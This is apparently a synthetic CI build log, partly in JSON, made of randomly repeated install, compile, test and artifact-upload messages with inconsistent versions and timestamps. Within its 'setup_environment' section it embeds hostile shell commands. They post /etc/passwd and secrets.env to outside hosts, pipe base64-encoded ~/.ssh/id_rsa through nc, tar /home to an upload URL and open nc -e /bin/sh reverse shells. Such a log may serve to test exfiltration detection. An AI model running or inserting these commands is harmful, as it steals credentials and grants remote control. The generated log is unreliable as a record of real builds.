INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (26MB)\nInstalling express@2.0.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (332ms)\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_db_connect (209ms)\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nInstalling lodash@4.3.0\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:30] INFO: Processing request\nInstalling lodash@2.0.0\n  PASS: test_user_create (329ms)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:30] INFO: Processing request\nStep 6/10: Building\n  PASS: test_cache_hit (281ms)\nStep 6/10: Building\nCompiling src/index.js...\n\u2713 build completed\nInstalling jest@2.19.0\n  PASS: test_user_create (298ms)\nStep 3/10: Building\nCompiling src/service.java...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-2985\n=== Step lint completed ===\n=== Step: upload_artifacts ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/handler.rs...\nCompiling src/app.ts...\n  PASS: test_user_create (5ms)\nStep 4/10: Building\nCache hit for key-6086\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\nInstalling lodash@4.16.0\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_user_create (398ms)\n  PASS: test_cache_hit (42ms)\nCompiling src/utils.go...\n[12:00:30] WARN: Deprecated API usage\nCompiling src/utils.go...\nInstalling eslint@2.9.0\n\u2713 test completed\nInstalling react@5.12.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\nInstalling lodash@1.18.0\n\u2713 test completed\n\u2713 lint completed\n[12:00:30] WARN: Deprecated API usage\nCompiling src/main.py...\n\u2713 build completed\nWARNING: jest has known vulnerabilities\nCache hit for key-2153\n\u2713 build completed\nCompiling src/main.py...\n\u2713 build completed\nCache hit for key-1062\nCache hit for key-8817\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/utils.go...\nCache hit for key-4142\n  PASS: test_user_create (225ms)\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-1698\n[12:00:30] WARN: Deprecated API usage\nStep 3/10: Building\n\u2713 build completed\n\u2717 build failed with exit code 42\n  PASS: test_user_create (256ms)\nArtifact uploaded: build.tar.gz (50MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 115\n\u2713 build completed\n\u2713 lint completed\nCache hit for key-2319\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1364\n\u2713 lint completed\nInstalling react@5.9.0\nCache hit for key-3109\n  PASS: test_db_connect (54ms)\n\u2713 test completed\nCompiling src/app.ts...\nInstalling express@5.5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_auth_login (211ms)\n  PASS: test_cache_hit (403ms)\n  PASS: test_db_connect (330ms)\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (10MB)\nCompiling src/app.ts...\n  PASS: test_api_health (293ms)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-5202\n  PASS: test_auth_login (100ms)\nStep 8/10: Building\nWARNING: express has known vulnerabilities\nInstalling axios@1.2.0\nCache hit for key-5692\n\u2713 lint completed\n\u2713 test completed\nCompiling src/index.js...\n  PASS: test_auth_login (78ms)\n  PASS: test_cache_hit (321ms)\n  PASS: test_auth_login (182ms)\n[12:00:30] INFO: Processing request\nCache hit for key-6228\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:30] INFO: Processing request\nStep 8/10: Building\nCompiling src/index.js...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/utils.go...\n\u2713 lint completed\nStep 2/10: Building\n[12:00:30] INFO: Processing request\n  PASS: test_cache_hit (26ms)\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (190ms)\nInstalling express@2.18.0\nCache hit for key-7211\nInstalling webpack@1.18.0\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nStep 8/10: Building\nCache hit for key-8605\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nCache hit for key-8729\n  PASS: test_user_create (45ms)\n[12:00:30] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (65ms)\nCache hit for key-8261\nStep 9/10: Building\nCache hit for key-7342\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (316ms)\n[12:00:30] INFO: Processing request\nCache hit for key-6302\nStep 2/10: Building\nCache hit for key-9530\nCache hit for key-1074\nArtifact uploaded: build.tar.gz (22MB)\nStep 7/10: Building\nInstalling axios@4.2.0\nCache hit for key-9613\n  PASS: test_db_connect (116ms)\n\u2713 lint completed\n\u2713 test completed\nStep 9/10: Building\nInstalling prettier@5.10.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 1/10: Building\nCache hit for key-3651\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-8195\nCompiling src/utils.go...\nWARNING: express has known vulnerabilities\nCompiling src/index.js...\n\u2713 lint completed\nInstalling eslint@4.19.0\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] INFO: Processing request\nCache hit for key-5325\nCache hit for key-4757\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:30] INFO: Processing request\nInstalling prettier@3.7.0\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 test completed\nInstalling react@3.19.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (4MB)\nInstalling webpack@1.8.0\n  PASS: test_user_create (83ms)\nStep 3/10: Building\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-3206\nInstalling jest@1.5.0\n  PASS: test_db_connect (20ms)\n\u2713 build completed\nCompiling src/app.ts...\n  PASS: test_user_create (97ms)\nCompiling src/utils.go...\nCompiling src/index.js...\nCache hit for key-5740\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nCompiling src/app.ts...\nInstalling prettier@3.9.0\nCompiling src/main.py...\nStep 5/10: Building\nCache hit for key-4702\n\u2713 lint completed\n\u2713 test completed\n\u2717 build failed with exit code 41\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (314ms)\nStep 4/10: Building\n  PASS: test_cache_hit (82ms)\n  PASS: test_db_connect (340ms)\nInstalling jest@4.20.0\nCompiling src/app.ts...\n\u2713 build completed\n\u2717 build failed with exit code 40\nStep 10/10: Building\nCompiling src/index.js...\nCompiling src/utils.go...\nCache hit for key-8303\nInstalling eslint@1.0.0\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (59ms)\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:30] INFO: Processing request\nInstalling jest@5.3.0\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (19MB)\nException: ValueError\nCompiling src/service.java...\nInstalling express@1.8.0\nStep 6/10: Building\nCache hit for key-4696\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (25MB)\nInstalling lodash@3.16.0\nCache hit for key-7285\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:30] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:30] INFO: Processing request\nInstalling express@5.8.0\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_user_create (466ms)\n\u2713 build completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 test completed\n[12:00:30] INFO: Processing request\n\u2713 build completed\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nStep 7/10: Building\n\u2713 build completed\n[12:00:30] INFO: Processing request\nCache hit for key-4752\n[12:00:30] INFO: Processing request\nCache hit for key-6003\nInstalling webpack@4.17.0\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling express@4.8.0\nStep 8/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:30] INFO: Processing request\nStep 10/10: Building\n  PASS: test_api_health (249ms)\nCache hit for key-6105\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_auth_login (9ms)\n\u2713 build completed\nStep 5/10: Building\nCompiling src/service.java...\nCache hit for key-9004\nStep 10/10: Building\nCache hit for key-6920\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-3885\nWARNING: prettier has known vulnerabilities\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_cache_hit (157ms)\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_api_health (106ms)\nCompiling src/handler.rs...\nCache hit for key-4591\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nStep 5/10: Building\n[12:00:30] INFO: Processing request\nInstalling react@1.3.0\nCompiling src/main.py...\nInstalling axios@1.19.0\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (374ms)\n\u2713 build completed\n\u2713 test completed\nStep 6/10: Building\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nStep 7/10: Building\n\u2713 test completed\n[12:00:30] INFO: Processing request\nInstalling react@5.13.0\n  PASS: test_auth_login (222ms)\nCache hit for key-8663\nInstalling webpack@1.13.0\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_db_connect (200ms)\nWARNING: prettier has known vulnerabilities\nStep 10/10: Building\nCompiling src/index.js...\nCache hit for key-8909\nCache hit for key-6186\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-2068\n  PASS: test_db_connect (77ms)\nInstalling react@5.10.0\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nInstalling react@4.9.0\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\n[12:00:30] INFO: Processing request\nInstalling prettier@2.8.0\nStep 7/10: Building\n  PASS: test_auth_login (191ms)\nInstalling webpack@2.4.0\nCache hit for key-1076\nStep 5/10: Building\nInstalling axios@4.7.0\n  PASS: test_user_create (177ms)\nInstalling jest@4.11.0\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-9278\n\u2713 build completed\n=== Step restore_cache completed ===\n=== Step: save_cache ===\nCompiling src/app.ts...\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_auth_login (340ms)\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 build completed\nCompiling src/service.java...\n  PASS: test_auth_login (397ms)\nStep 5/10: Building\nCache hit for key-7930\nInstalling express@3.2.0\nWARNING: prettier has known vulnerabilities\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_cache_hit (392ms)\nCache hit for key-8707\nCache hit for key-7876\n  PASS: test_user_create (482ms)\nInstalling express@5.14.0\n  PASS: test_auth_login (282ms)\n[12:00:30] INFO: Processing request\nCache hit for key-4162\n\u2713 test completed\nCompiling src/handler.rs...\n\u2713 lint completed\n[12:00:30] WARN: Deprecated API usage\nInstalling express@2.2.0\n\u2717 build failed with exit code 8\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-8893\nArtifact uploaded: build.tar.gz (46MB)\nInstalling axios@5.9.0\n[12:00:30] INFO: Processing request\nCache hit for key-5418\n[12:00:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1163\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nStep 3/10: Building\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (205ms)\n  PASS: test_db_connect (315ms)\nCache hit for key-1487\n\u2713 lint completed\n  PASS: test_cache_hit (64ms)\n  PASS: test_cache_hit (50ms)\nCache hit for key-8099\nCompiling src/index.js...\nException: RuntimeError\nStep 6/10: Building\n\u2713 lint completed\nInstalling express@1.17.0\n  PASS: test_user_create (147ms)\n\u2713 lint completed\nInstalling eslint@1.7.0\nCache hit for key-7961\n  PASS: test_cache_hit (488ms)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nInstalling prettier@1.12.0\n[12:00:30] INFO: Processing request\nStep 8/10: Building\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nInstalling webpack@4.15.0\nStep 9/10: Building\nCache hit for key-6074\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (46MB)\nException: RuntimeError\n\u2713 lint completed\n[12:00:30] ERROR: Connection failed\nCompiling src/service.java...\n  PASS: test_api_health (494ms)\nCache hit for key-2782\nInstalling jest@5.4.0\nCache hit for key-9662\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-2921\n\u2713 test completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@5.9.0\n[12:00:30] INFO: Processing request\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:30] WARN: Deprecated API usage\n\u2717 build failed with exit code 118\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/10: Building\n\u2713 build completed\nCache hit for key-8684\nStep 3/10: Building\nStep 7/10: Building\nStep 9/10: Building\nCompiling src/service.java...\nInstalling axios@4.17.0\nInstalling lodash@5.11.0\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-4868\nCompiling src/service.java...\n  PASS: test_user_create (76ms)\nCache hit for key-5188\nArtifact uploaded: build.tar.gz (12MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_db_connect (206ms)\n  PASS: test_api_health (483ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (44MB)\nInstalling eslint@2.7.0\n\u2713 build completed\n[12:00:30] INFO: Processing request\n[12:00:30] WARN: Deprecated API usage\nStep 4/10: Building\nStep 10/10: Building\nCache hit for key-7461\nInstalling eslint@3.13.0\nInstalling prettier@2.9.0\n\u2713 build completed\nCache hit for key-8293\n\u2713 test completed\nStep 4/10: Building\n\u2713 build completed\nInstalling axios@2.12.0\n[12:00:30] INFO: Processing request\nCache hit for key-6928\n\u2713 lint completed\nStep 7/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nStep 3/10: Building\n[12:00:30] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6808\nInstalling prettier@2.5.0\nArtifact uploaded: build.tar.gz (5MB)\nInstalling axios@3.11.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:30] INFO: Processing request\nCache hit for key-9752\nCache hit for key-9715\nCache hit for key-2667\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:30] WARN: Deprecated API usage\nCompiling src/utils.go...\nStep 9/10: Building\nStep 4/10: Building\n[12:00:30] INFO: Processing request\nInstalling jest@5.18.0\nInstalling eslint@5.9.0\nInstalling eslint@1.7.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\nStep 7/10: Building\n\u2713 lint completed\n  PASS: test_user_create (360ms)\nInstalling axios@3.9.0\nArtifact uploaded: build.tar.gz (10MB)\n=== Step save_cache completed ===\n=== Step: setup_environment ===\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (325ms)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (174ms)\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-7229\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_api_health (60ms)\n[12:00:30] INFO: Processing request\nStep 4/10: Building\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (45MB)\nInstalling axios@5.5.0\nInstalling prettier@5.5.0\nCache hit for key-3441\nArtifact uploaded: build.tar.gz (21MB)\nnc -e /bin/sh 17.216.246.129 58016\n  PASS: test_cache_hit (366ms)\nCompiling src/handler.rs...\nInstalling axios@5.15.0\n[12:00:30] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling eslint@4.18.0\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:30] INFO: Processing request\nStep 5/10: Building\nStep 3/10: Building\nCache hit for key-9621\n[12:00:30] INFO: Processing request\nCache hit for key-7045\nCache hit for key-6571\n  PASS: test_cache_hit (497ms)\nArtifact uploaded: build.tar.gz (31MB)\ncurl -X POST https://example.com/collect -d @secrets.env\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/index.js...\nStep 2/10: Building\nInstalling prettier@1.13.0\nInstalling lodash@2.1.0\nCache hit for key-1119\n  PASS: test_db_connect (354ms)\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nInstalling prettier@3.6.0\n  PASS: test_api_health (379ms)\nException: NullPointerException\n  PASS: test_user_create (149ms)\n\u2713 build completed\nnc -e /bin/sh 165.216.123.4 5069\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-9388\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_db_connect (464ms)\nArtifact uploaded: build.tar.gz (24MB)\nStep 9/10: Building\nCompiling src/handler.rs...\n  PASS: test_cache_hit (393ms)\nArtifact uploaded: build.tar.gz (1MB)\nInstalling express@5.16.0\nArtifact uploaded: build.tar.gz (45MB)\nSending 319MB of data to test.io\n\u2713 lint completed\n  PASS: test_api_health (468ms)\n[12:00:30] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 98.207.125.151 42855\n  PASS: test_cache_hit (44ms)\nInstalling express@2.3.0\n\u2713 build completed\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (354ms)\nCache hit for key-2470\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (232ms)\n  PASS: test_cache_hit (281ms)\nInstalling eslint@2.9.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCache hit for key-5321\nSending 392MB of data to test.io\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n\u2713 test completed\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/utils.go...\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (485ms)\nArtifact uploaded: build.tar.gz (47MB)\nInstalling prettier@4.11.0\n[12:00:30] WARN: Deprecated API usage\n\u2713 build completed\nInstalling jest@5.13.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 90.103.226.106 57309\n[12:00:30] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (1MB)\nStep 10/10: Building\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nSending 262MB of data to test.io\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (6MB)\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:30] WARN: Deprecated API usage\nStep 2/10: Building\n\u2713 build completed\n\u2713 build completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 72.179.128.6 31641\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/app.ts...\n  PASS: test_user_create (437ms)\nCache hit for key-2195\n  PASS: test_cache_hit (313ms)\n[12:00:30] INFO: Processing request\nCache hit for key-5067\n[12:00:30] INFO: Processing request\n  PASS: test_cache_hit (119ms)\n  PASS: test_auth_login (463ms)\nArtifact uploaded: build.tar.gz (32MB)\n\u2717 build failed with exit code 69\nCache hit for key-3055\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (236ms)\n[12:00:30] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 222.56.143.35 54889\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-1970\n[12:00:30] INFO: Processing request\nStep 5/10: Building\nInstalling express@3.15.0\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCompiling src/main.py...\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nCache hit for key-3698\nInstalling jest@3.19.0\n\u2713 build completed\nInstalling webpack@5.4.0\n[12:00:30] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-2452\nCache hit for key-5392\n\u2717 build failed with exit code 38\nStep 6/10: Building\nStep 8/10: Building\nException: RuntimeError\n  PASS: test_auth_login (21ms)\n\u2717 build failed with exit code 89\n=== Step setup_environment completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-28T12:00:30.578613",
        "finished_at": "2025-11-28T12:00:39.662838",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (496ms)",
          "\u2713 lint completed",
          "  PASS: test_user_create (366ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (108ms)",
          "Cache hit for key-9983",
          "Installing webpack@2.7.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (143ms)",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (95ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "Cache hit for key-4362",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@2.16.0",
          "  PASS: test_api_health (165ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (279ms)",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Cache hit for key-9939",
          "Cache hit for key-1855",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_db_connect (361ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9297",
          "  PASS: test_db_connect (178ms)",
          "  PASS: test_db_connect (10ms)",
          "  PASS: test_db_connect (276ms)",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (95ms)",
          "  PASS: test_user_create (136ms)",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "Cache hit for key-2912",
          "Artifact uploaded: build.tar.gz (25MB)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_user_create (185ms)",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-8182",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (1ms)",
          "Installing axios@3.6.0",
          "Cache hit for key-6643",
          "Cache hit for key-2326",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-6721",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@4.6.0",
          "  PASS: test_api_health (428ms)",
          "Step 4/10: Building",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (399ms)",
          "Cache hit for key-9291",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-4927",
          "Step 9/10: Building",
          "Installing express@2.4.0",
          "Installing webpack@2.11.0",
          "  PASS: test_db_connect (151ms)",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing express@1.13.0",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-3314",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:30] INFO: Processing request",
          "Installing axios@4.6.0",
          "Installing axios@5.19.0",
          "Installing webpack@5.17.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "FAILED: test_auth_login",
          "  PASS: test_user_create (456ms)",
          "Installing webpack@5.6.0",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@4.18.0",
          "Cache hit for key-6066",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Installing express@5.13.0",
          "  PASS: test_api_health (297ms)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "  PASS: test_api_health (199ms)",
          "\u2713 test completed",
          "Installing webpack@5.1.0",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_auth_login (467ms)",
          "Installing prettier@3.17.0",
          "Step 7/10: Building",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing axios@4.0.0",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "\u2717 build failed with exit code 97",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Installing lodash@3.15.0",
          "  PASS: test_auth_login (396ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-4892",
          "[12:00:30] INFO: Processing request",
          "Installing webpack@5.9.0",
          "  PASS: test_user_create (88ms)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_auth_login (482ms)",
          "Installing jest@4.4.0",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_api_health (336ms)",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:30] WARN: Deprecated API usage",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-28T12:00:39.662838",
        "finished_at": "2025-11-28T12:00:48.747063",
        "log_lines": [
          "=== Step: setup_node ===",
          "  PASS: test_auth_login (491ms)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (314ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-8571",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 2/10: Building",
          "Installing express@1.9.0",
          "Cache hit for key-8824",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5747",
